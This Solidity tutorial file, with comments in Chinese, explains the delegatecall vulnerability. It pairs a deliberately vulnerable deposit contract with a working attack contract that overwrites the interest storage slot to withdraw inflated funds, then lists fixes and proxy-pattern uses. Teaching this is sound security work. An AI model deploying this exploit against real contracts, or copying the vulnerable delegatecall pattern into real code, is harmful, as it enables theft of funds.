// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
@DelegateCall漏洞
- 基本介绍
    - DelegateCall 与 Call 类似，是 solidity 中地址类型的low-level成员函数（delegate是委托/代表的意思），下面描述二者区别：
        - 当用户A通过 合约B 来【Call】 合约C 的时候，执行的是 合约C 的函数，上下文 (Context，包含变量和状态) 也是合约 C 的;
            msg.sender 是 B 的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约 C 的变量上。这种调用方式符合人的正常思维（除了msg.sender=B不好理解之外）。

        - 当用户A 通过 合约B 来 【DelegateCall】 合约C 的时候，执行的是合约 C 的函数，但是上下文仍是 合约B 的；
            msg.sender 是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于 合约B 的变量上。这种调用方式不符合人的正常思维，
            使用此种调用方式的合约可能存在漏洞，除非开发者知道自己在做什么。

    - 简单理解，Call会将msg.sender和context变更为相应的调用合约和被调用合约环境中的信息，但DelegateCall则不会变更（就只是执行被调用合约的代码而已）。
      官方表示的用途：便于一个合约实现在运行时，address和变量保持不变，但执行从外部地址动态加载的代码逻辑，类似一种钩子的实现。
    - 注意：正因为DelegateCall信任外部代码的特点，所以开发者使用它的时候，也要确认调用的是一个可绝对信任的地址，否则存在重大风险。

    - 二者使用方式： being_called_address.call/delegatecall(funcSig_and_args_codec)
        -   funcSig_and_args_codec = abi.encodeWithSignature("somefunc(uint256)", 1)，在这个abi调用中，somefunc(uint256)是函数签名，1是其参数
        -   旧的solidity版本中，调用方式为: being_called_address.call/delegatecall(bytes4(keccak256("somefunc(uint256)")), 1)

*/

// 1. 给出一个存在delegatecall漏洞的合约
contract Store {
    // 固定利息 10个点，即取款时获得 1+10%
    uint256 interest = 10;
    mapping(address => uint256) balances;

    string constant callerReceiveSig = "callerReceive(uint256,uint256)";

    event InterestPrint(uint256);
    constructor() payable {}

    // 存款函数
    function deposit() public payable {
        require(msg.value > 0, "need eth");
        balances[msg.sender] += msg.value;
    }

    function withdrawAll(address to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "no balance");

        // 存在漏洞的位置: 假定此存款合约的业务逻辑需要回调 收款地址的 callerReceive(uint256,uint256)
        (bool success, ) = to.delegatecall(abi.encodeWithSignature(callerReceiveSig, _amount, interest));
        require(success, "call callerReceive failed!");

        // 打印利息点数（此时已被攻击合约修改，并且是永久修改）
        emit InterestPrint(interest);

        require(0 < interest && interest < 100, "invalid interest");

        // 计算带利息的提款额
        uint256 transferVal = _amount * (100 + interest) / 100;
        require(address(this).balance >= transferVal, "contract is no balance! plz inform the boss to deposit!");

        // 准备转账
        balances[msg.sender] -= _amount;
        payable(to).transfer(transferVal);
    }
}

// 2. 给出攻击合约示例
contract Attack {
    uint interest = 0;
    uint depositVal;
    Store store;

    constructor(address _storeAddr) {
        store = Store(_storeAddr);
    }
    function deposit()public payable{
        // 先存入2 eth（value输入2 ether）
        // 注意：需要通过 花括号{} 来修改value，并不会自动透传
        store.deposit{value: msg.value}();
        depositVal = msg.value;
    }
    function withdraw() public  {
        // 再取出1 eth，若修改利润点成功，将会取出1.5 eth
        store.withdrawAll(address(this), depositVal / 2);
    }
    function callerReceive(uint256, uint256) external {
        // 攻击代码，将利息改为50个点
        interest = 50;
    }

    // 合约地址必须定义 fallback 或 receive函数之一 才能收款，否则对此合约地址的转账操作将revert！同时注意以下两点：
    // 1. 要求必须是external payable
    // 2. 若同时定义，则只会调用receive()
    fallback() external payable {}
    receive() external payable {}
}

// 改进/修复方法：
// 1. 资产变更后 再与外部地址交互，即遵循 检查-生效-交互模式
// 2. 重要函数 不要使用DelegateCall

/*
@扩展
- 一般什么场景下会用到 delegatecall ？
    1. 代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，
        并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过 delegatecall 执行。当升级时，只需要将代理合约指向新的逻辑合约即可。
    2. EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。
        更多信息请查看：钻石标准简介。
*/